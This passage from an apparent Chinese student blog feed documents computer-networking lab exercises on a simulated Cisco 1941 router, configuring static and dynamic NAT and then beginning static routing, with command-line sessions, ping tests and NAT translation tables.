class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br></pre></td></tr></table></figure><h2 id="配置两台pc的ip地址"><a href="#配置两台pc的ip地址" class="headerlink" title="配置两台pc的ip地址"></a>配置两台pc的ip地址</h2><p>直接双击配置，pc1设置192.168.1.5，PC2设置200.8.7.100</p><h2 id="定义NAT内网口和外网口"><a href="#定义NAT内网口和外网口" class="headerlink" title="定义NAT内网口和外网口"></a>定义NAT内网口和外网口</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#int g0/<span class="number">1</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip nat outside</span><br><span class="line">Router(config-<span class="keyword">if</span>)#int g0/<span class="number">0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip nat inside</span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure><h1 id="静态NAT"><a href="#静态NAT" class="headerlink" title="静态NAT"></a>静态NAT</h1><h2 id="配置静态NAT"><a href="#配置静态NAT" class="headerlink" title="配置静态NAT"></a>配置静态NAT</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Router(config-<span class="keyword">if</span>)#ip nat inside source <span class="keyword">static</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.3</span></span><br><span class="line">Router(config)#</span><br></pre></td></tr></table></figure><h2 id="目前的配置信息"><a href="#目前的配置信息" class="headerlink" title="目前的配置信息"></a>目前的配置信息</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">Router(config-<span class="keyword">if</span>)#<span class="keyword">do</span> show run</span><br><span class="line">Building configuration...</span><br><span class="line"></span><br><span class="line">Current configuration : <span class="number">716</span> bytes</span><br><span class="line">!</span><br><span class="line">version <span class="number">15.1</span></span><br><span class="line">no service timestamps log datetime msec</span><br><span class="line">no service timestamps debug datetime msec</span><br><span class="line">no service password-encryption</span><br><span class="line">!</span><br><span class="line">hostname Router</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip cef</span><br><span class="line">no ipv6 cef</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">license udi pid CISCO1941/K9 sn FTX15248DH1-</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">spanning-tree mode pvst</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">interface GigabitEthernet0/<span class="number">0</span></span><br><span class="line"> ip address <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"> ip nat inside</span><br><span class="line"> duplex auto</span><br><span class="line"> speed auto</span><br><span class="line">!</span><br><span class="line">interface GigabitEthernet0/<span class="number">1</span></span><br><span class="line"> ip address <span class="number">200.8</span><span class="number">.7</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"> ip nat outside</span><br><span class="line"> duplex auto</span><br><span class="line"> speed auto</span><br><span class="line">!</span><br><span class="line">interface Vlan1</span><br><span class="line"> no ip address</span><br><span class="line"> shutdown</span><br><span class="line">!</span><br><span class="line">ip nat inside source <span class="keyword">static</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.3</span> </span><br><span class="line">ip classless</span><br><span class="line">!</span><br><span class="line">ip flow-<span class="keyword">export</span> version <span class="number">9</span></span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">line con <span class="number">0</span></span><br><span class="line">!</span><br><span class="line">line aux <span class="number">0</span></span><br><span class="line">!</span><br><span class="line">line vty <span class="number">0</span> <span class="number">4</span></span><br><span class="line"> login</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure><h2 id="产生NAT记录"><a href="#产生NAT记录" class="headerlink" title="产生NAT记录"></a>产生NAT记录</h2><p>使用PC1 ping PC2</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Request timed out.</span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">3</span>, Lost = <span class="number">1</span> (<span class="number">25</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\&gt;</span><br></pre></td></tr></table></figure><p>再回到Router，输入show ip nat translations</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Router#show ip nat translations </span><br><span class="line">Pro  Inside <span class="built_in">global</span>     Inside local       Outside local      Outside <span class="built_in">global</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.3</span>:<span class="number">5</span>       <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">5</span>      <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">5</span>      <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">5</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.3</span>:<span class="number">6</span>       <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">6</span>      <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">6</span>      <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">6</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.3</span>:<span class="number">7</span>       <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">7</span>      <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">7</span>      <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">7</span></span><br><span class="line">---  <span class="number">200.8</span><span class="number">.7</span><span class="number">.3</span>         <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>        ---                ---</span><br><span class="line"></span><br><span class="line">Router#</span><br></pre></td></tr></table></figure><h1 id="动态NAT"><a href="#动态NAT" class="headerlink" title="动态NAT"></a>动态NAT</h1><p>使用 access-list 配置动态NAT，相关功能与配置信息如下</p><h2 id="定义默认路由内部本地地址范围"><a href="#定义默认路由内部本地地址范围" class="headerlink" title="定义默认路由内部本地地址范围"></a>定义默认路由内部本地地址范围</h2><p>这里的10我猜测是可通过10个不同的192.168.1.0/24地址访问？</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#access-list ?</span><br><span class="line">  &lt;<span class="number">1</span>-<span class="number">99</span>&gt;     IP standard access list</span><br><span class="line">  &lt;<span class="number">100</span>-<span class="number">199</span>&gt;  IP extended access list</span><br><span class="line">Router(config)#access-list <span class="number">10</span> ?</span><br><span class="line">  deny    Specify packets to reject</span><br><span class="line">  permit  Specify packets to forward</span><br><span class="line">  remark  Access list entry comment</span><br><span class="line">Router(config)#access-list <span class="number">10</span> permit ?</span><br><span class="line">  A.B.C.D  Address to match</span><br><span class="line">  any      Any source host</span><br><span class="line">  host     A single host address</span><br><span class="line">Router(config)#access-list <span class="number">10</span> permit <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.255</span></span><br><span class="line">Router(config)#</span><br></pre></td></tr></table></figure><h2 id="定义转换全局地址池"><a href="#定义转换全局地址池" class="headerlink" title="定义转换全局地址池"></a>定义转换全局地址池</h2><p>这里的200.8.7.10与200.8.7.20<del>我猜测</del>（确实）是使用地址范围，至于这个abc应该是个地址池名称？如有错误欢迎大家之处0w0</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#ip nat ?</span><br><span class="line">  inside   Inside address translation</span><br><span class="line">  outside  Outside address translation</span><br><span class="line">  pool     Define pool <span class="keyword">of</span> addresses</span><br><span class="line">Router(config)#ip nat pool ?</span><br><span class="line">  WORD  Pool name</span><br><span class="line">Router(config)#ip nat pool abc ?</span><br><span class="line">  A.B.C.D  Start IP address</span><br><span class="line">Router(config)#ip nat pool abc <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span> ?</span><br><span class="line">  A.B.C.D  End IP address</span><br><span class="line">Router(config)#ip nat pool abc <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.20</span> ?</span><br><span class="line">  netmask  Specify the network mask</span><br><span class="line">Router(config)#ip nat pool abc <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.20</span> netmask ?</span><br><span class="line">  A.B.C.D  Network mask</span><br><span class="line">Router(config)#ip nat pool abc <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span> <span class="number">200.8</span><span class="number">.7</span><span class="number">.20</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><h2 id="建立映射关系"><a href="#建立映射关系" class="headerlink" title="建立映射关系"></a>建立映射关系</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#ip nat ?</span><br><span class="line">  inside   Inside address translation</span><br><span class="line">  outside  Outside address translation</span><br><span class="line">  pool     Define pool <span class="keyword">of</span> addresses</span><br><span class="line">Router(config)#ip nat inside ?</span><br><span class="line">  source  Source address translation</span><br><span class="line">Router(config)#ip nat inside source ?</span><br><span class="line">  list    Specify access list describing local addresses</span><br><span class="line">  <span class="keyword">static</span>  Specify <span class="keyword">static</span> local-&gt;<span class="built_in">global</span> mapping</span><br><span class="line">Router(config)#ip nat inside source list ?</span><br><span class="line">  &lt;<span class="number">1</span>-<span class="number">199</span>&gt;  Access list number <span class="keyword">for</span> local addresses</span><br><span class="line">  WORD     Access list name <span class="keyword">for</span> local addresses</span><br><span class="line">Router(config)#ip nat inside source list <span class="number">10</span> ?</span><br><span class="line">  interface  Specify interface <span class="keyword">for</span> <span class="built_in">global</span> address</span><br><span class="line">  pool       Name pool <span class="keyword">of</span> <span class="built_in">global</span> addresses</span><br><span class="line">Router(config)#ip nat inside source list <span class="number">10</span> pool ?</span><br><span class="line">  WORD  Name pool <span class="keyword">of</span> <span class="built_in">global</span> addresses</span><br><span class="line">Router(config)#ip nat inside source list <span class="number">10</span> pool</span><br></pre></td></tr></table></figure><h2 id="检查地址转换表"><a href="#检查地址转换表" class="headerlink" title="检查地址转换表"></a>检查地址转换表</h2><p>使用PC1 ping PC2，检查</p><p>地址转换表</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#show ip nat translations</span><br><span class="line">                ^</span><br><span class="line">% Invalid input detected at <span class="string">&#x27;^&#x27;</span> marker.</span><br><span class="line"></span><br><span class="line">Router(config)#<span class="keyword">do</span> show ip nat translations</span><br><span class="line">Pro  Inside <span class="built_in">global</span>     Inside local       Outside local      Outside <span class="built_in">global</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span>:<span class="number">10</span>     <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">10</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">10</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">10</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span>:<span class="number">11</span>     <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">11</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">11</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">11</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span>:<span class="number">12</span>     <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">12</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">12</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">12</span></span><br><span class="line">icmp <span class="number">200.8</span><span class="number">.7</span><span class="number">.10</span>:<span class="number">13</span>     <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">13</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">13</span>     <span class="number">200.8</span><span class="number">.7</span><span class="number">.100</span>:<span class="number">13</span></span><br><span class="line"></span><br><span class="line">Router(config)#</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h1&gt;&lt;p&gt;1941 Router，2PC，使用 Copper Cross-over 连接，要求左接口ip为192.168.1.1，右接口ip为200.8.7.1，网络拓扑如下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&quot;/images/Article/Principles-Of-Computer-Networks-Experiment/Network-Topology.png&quot; alt=&quot;Network-Topology.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    <category term="计算机网络原理" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/"/>
    
    <category term="学习" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="实验" scheme="https://guo.moe/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络原理实验四──路由器基本配置</title>
    <link href="https://guo.moe/archives/Principles-Of-Computer-Networks-Experiment-4.html"/>
    <id>https://guo.moe/archives/Principles-Of-Computer-Networks-Experiment-4.html</id>
    <published>2021-04-23T15:00:00.000Z</published>
    <updated>2021-04-23T14:44:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>路由器基本配置可分为静态路由配置和动态路由配置</p><p>两台路由互相连接，并将路由器连接至PC机，路由器之间配置192.168.1.0/24 网段，路由器1与PC1配置192.168.2.0/24网段，路由器2与PC2配置192.168.3.0/24网段</p><p>路由器选择1941进行。</p><p>使用 Copper Cross-over 连接所有设备，将路由器的0/1口与PC网口相连，路由器0/0口与另一个路由器相连。</p><p>更改名称便于区分，将Router0改为R1，将Router1改为R2</p><span id="more"></span><h1 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h1><h2 id="路由器配置"><a href="#路由器配置" class="headerlink" title="路由器配置"></a>路由器配置</h2><p>进入R1的CLI中，完成 g0/0 的端口配置</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Router#en</span><br><span class="line">Router#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Router(config)#int g0/<span class="number">0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh <span class="comment">// 将端口设为启用</span></span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure><p>同时配置 g0/1 的端口</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Router(config-<span class="keyword">if</span>)#int g0/<span class="number">1</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br></pre></td></tr></table></figure><p>此处 g0/1 配置完成后就直接连通了，这是因为PC的接口不需要手动启用，而另一个路由器还未配置完毕，接口需要在配置面板或者输入 no sh 来启用，要禁用的时候可以输入 shutdown</p><p>给PC0配置 192.168.2.2 地址，并尝试在命令提示符中 ping 192.168.2.1，成功连通。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">255</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">255</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">255</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">255</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">4</span>, Lost = <span class="number">0</span> (<span class="number">0</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\&gt;</span><br></pre></td></tr></table></figure><p>根据操作给R2的g0/0配置192.168.1.2地址，给g0/1配置192.168.3.1地址</p><h2 id="配置静态路由"><a href="#配置静态路由" class="headerlink" title="配置静态路由"></a>配置静态路由</h2><p>在R1上，设置静态路由，让PC0可以访问到PC1</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Router#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Router(config)#ip route <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span></span><br><span class="line"><span class="comment">// 目的网络 子网掩码 下一跳</span></span><br></pre></td></tr></table></figure><p>输入do show run查看当前配置</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#<span class="keyword">do</span> show run</span><br><span class="line">Building configuration...</span><br><span class="line"></span><br><span class="line">Current configuration : <span class="number">687</span> bytes</span><br><span class="line">!</span><br><span class="line">version <span class="number">15.1</span></span><br><span class="line">no service timestamps log datetime msec</span><br><span class="line">no service timestamps debug datetime msec</span><br><span class="line">no service password-encryption</span><br><span class="line">!</span><br><span class="line">hostname Router</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">no ip cef</span><br><span class="line">no ipv6 cef</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">license udi pid CISCO1941/K9 sn FTX152485P5-</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">spanning-tree mode pvst</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">interface GigabitEthernet0/<span class="number">0</span></span><br><span class="line"> ip address <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"> duplex auto</span><br><span class="line"> speed auto</span><br><span class="line">!</span><br><span class="line">interface GigabitEthernet0/<span class="number">1</span></span><br><span class="line"> ip address <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"> duplex auto</span><br><span class="line"> speed auto</span><br><span class="line">!</span><br><span class="line">interface Vlan1</span><br><span class="line"> no ip address</span><br><span class="line"> shutdown</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route <span class="number">192.168</span><span 